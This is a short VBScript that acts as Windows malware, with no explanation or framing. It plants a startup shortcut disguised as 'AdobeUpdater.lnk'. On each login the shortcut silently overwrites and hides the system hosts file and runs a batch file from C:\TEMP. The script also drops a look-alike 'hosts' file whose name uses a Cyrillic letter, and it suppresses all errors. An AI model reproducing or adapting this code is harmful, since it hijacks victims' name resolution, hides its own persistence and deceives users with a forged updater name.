dim filesys
On Error Resume Next
Set filesys = CreateObject("Scripting.FileSystemObject")
set WshShell = WScript.CreateObject("WScript.Shell")
set oShellLink = WshShell.CreateShortcut("C:\Documents and Settings\Охрана\Главное меню\Программы\Автозагрузка\AdobeUpdater.lnk")
oShellLink.TargetPath = "C:\WINDOWS\system32\cmd.exe"
oShellLink.Arguments = " /c copy ""C:\TEMP\h1"" ""C:\WINDOWS\system32\drivers\etc\hosts"" /Y && attrib +H ""C:\WINDOWS\system32\drivers\etc\hosts"" && ""C:\TEMP\x1.bat"""
oShellLink.IconLocation = "C:\TEMP\2.ico"
oShellLink.WindowStyle = 7
oShellLink.Description = "Shortcut Script"
oShellLink.WorkingDirectory = "C:\WINDOWS\system32"
oShellLink.Save
filesys.CopyFile "C:\TEMP\h2","C:\WINDOWS\system32\drivers\etc\hоsts",OverwriteExisting
Wscript.Sleep 3000
